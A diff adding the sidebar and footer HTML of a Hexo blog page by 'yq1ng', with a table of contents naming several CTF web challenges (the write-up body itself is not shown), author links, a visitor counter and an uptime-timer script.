+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Ping-Ping-Ping"><span class="nav-number">1.</span> <span class="nav-text">Ping Ping Ping</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BabySQli"><span class="nav-number">2.</span> <span class="nav-text">BabySQli</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="nav-number">3.</span> <span class="nav-text">禁止套娃</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BabyUpload"><span class="nav-number">4.</span> <span class="nav-text">BabyUpload</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#StrongestMind"><span class="nav-number">5.</span> <span class="nav-text">StrongestMind</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BabysqliV3-0"><span class="nav-number">6.</span> <span class="nav-text">BabysqliV3.0</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#END"><span class="nav-number">7.</span> <span class="nav-text">END</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yq1ng"
+      src="/images/xiaoxin.jpg">
+  <p class="site-author-name" itemprop="name">yq1ng</p>
+  <div class="site-description" itemprop="description">The best way to know your strength is to fight</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/yq1ng" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yq1ng" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/weixin_43578492" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_43578492" rel="noopener" target="_blank"><i class="heartbeat fa-fw"></i>CSDN</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1578422748@qq.com" title="E-Mail → mailto:1578422748@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=%271578422748++%27&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;&#39;1578422748++&#39;&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="qq fa-fw"></i>QQ</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <script
+  async
+  src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"
+></script>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yq1ng</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">47k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">1:18</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+<br /> #换行
+<!-- 网站运行时间的设置 -->
+<span id="timeDate">载入天数...</span>
+<span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("09/27/2020 00:00:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  <!-- 页面点击小红心 -->
+  <script type="text/javascript" src="/js/src/clicklove.js"></script>
+</body>
+</html>
